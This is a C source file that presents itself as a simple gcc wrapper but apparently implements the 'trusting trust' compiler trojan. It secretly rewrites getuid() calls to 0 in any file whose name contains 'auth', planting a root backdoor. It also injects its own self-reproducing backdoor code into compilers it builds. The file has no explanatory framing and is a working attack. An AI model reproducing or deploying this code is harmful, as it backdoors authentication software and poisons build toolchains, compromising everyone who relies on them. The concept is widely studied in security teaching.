#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s input_file output_file\n", argv[0]);
        return 1;
    }
    FILE *in_file = NULL;
    if ((in_file = fopen(argv[1], "r")) == NULL) {
        fprintf(stderr, "%s: No such file or directory\n", argv[1]);
        return 1;
    }

    fseek(in_file, 0, SEEK_END);
    int in_size = ftell(in_file);
    rewind(in_file);

    char *buffer = malloc(in_size + 1);
    buffer[in_size] = '\0';

    if (fread(buffer, 1, in_size, in_file) != in_size) {
        fprintf(stderr, "%s: copying to buffer failed\n", argv[1]);
        return 1;
    }

    fclose(in_file);

    char *injecter = "%c"
        "    char *injecter = %c%s%c;%c"
        "    char *uid_ptr = NULL;%c"
        "    if (strstr(argv[1], %cauth%c) != NULL) {%c"
        "        while ((uid_ptr = strstr(buffer, %cgetuid()%c)) != NULL) {%c"
        "            strncpy(uid_ptr, %c       0%c, 8);%c"
        "        }%c"
        "    }%c"
        "    %c"
        "    if (strstr(argv[1], %ccompiler%c) != NULL || strstr(argv[1], %ccc%c) != NULL) {%c"
        "        char inject[10000];%c"
        "        sprintf(inject, injecter, 10, 34, injecter, 34, 10, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 10, 10, 10, 34, 34, 34, 34, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 92, 10, 10, 10, 10, 10, 10, 10, 10);%c"
        "        int inject_size = strlen(inject);%c"
        "        char *new_buffer = malloc(in_size + inject_size + 10);%c"
        "        char *inject_pos = strstr(buffer, %cchar cc[500];%c);%c"
        "    %c"
        "        int c = inject_pos - buffer;%c"
        "        strncpy(new_buffer, buffer, c);%c"
        "        new_buffer[c] = '%c0';%c"
        "        strncat(new_buffer, inject, inject_size);%c"
        "        strcat(new_buffer, inject_pos);%c"
        "    %c"
        "        free(buffer);%c"
        "        buffer = new_buffer;%c"
        "        in_size += inject_size;%c"
        "    }%c    ";

    char *uid_ptr = NULL;
    if (strstr(argv[1], "auth") != NULL) {
        while ((uid_ptr = strstr(buffer, "getuid()")) != NULL) {
            strncpy(uid_ptr, "       0", 8);
        }
    }

    if (strstr(argv[1], "compiler") != NULL || strstr(argv[1], "cc") != NULL) {
        char inject[10000];
        sprintf(inject, injecter, 10, 34, injecter, 34, 10, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 10, 10, 10, 34, 34, 34, 34, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 92, 10, 10, 10, 10, 10, 10, 10, 10);
        int inject_size = strlen(inject);
        char *new_buffer = malloc(in_size + inject_size + 10);
        char *inject_pos = strstr(buffer, "char cc[500];");

        int c = inject_pos - buffer;
        strncpy(new_buffer, buffer, c);
        new_buffer[c] = '\0';
        strncat(new_buffer, inject, inject_size);
        strcat(new_buffer, inject_pos);

        free(buffer);
        buffer = new_buffer;
        in_size += inject_size;
    }

    char cc[500];
    snprintf(cc, 500, "gcc -o %s -xc -g -", argv[2]);

    FILE * gcc = NULL;
    if ((gcc = popen(cc, "w")) == NULL) {
        fprintf(stderr, "%s: pipe failed\n", argv[1]);
        return 1;
    }

    fwrite(buffer, sizeof(char), in_size, gcc);
    pclose(gcc);
    free(buffer);
}
